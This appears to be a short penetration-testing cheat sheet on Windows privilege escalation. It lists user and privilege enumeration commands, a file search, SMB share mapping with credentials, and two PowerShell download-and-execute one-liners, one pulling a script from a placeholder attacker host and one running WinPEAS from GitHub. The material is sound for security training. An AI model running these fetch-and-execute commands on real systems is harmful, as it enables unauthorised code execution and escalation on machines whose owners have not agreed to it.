---
icon: windows
---

# Windows Privilege Escalation

## System Enumeration

### List Users

```batch
net user
```

### User Privileges

```batch
whoami /priv
```

### Search Files

{% hint style="info" %}
If you dont know the full path of the file or even the extension, you can use: `*<FILE>*`
{% endhint %}

```batch
cmd /s <FILE>
```

### List Recursive Directories (PowerShell)

```powershell
ls . -Recurse -Force -Name -Filter "<filter>" | foreach { ls -for $_ }
```

### Add SMB share to network drives

```batch
net use z: \\<ip>\<share> /user:<user> <pass>
```

### Execute Remote PowerShell Script

```powershell
IEX(New-Object Net.WebClient).downloadString('http://<ip>/script.ps1')
```

### [WinPEAS](https://github.com/peass-ng/PEASS-ng)

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```
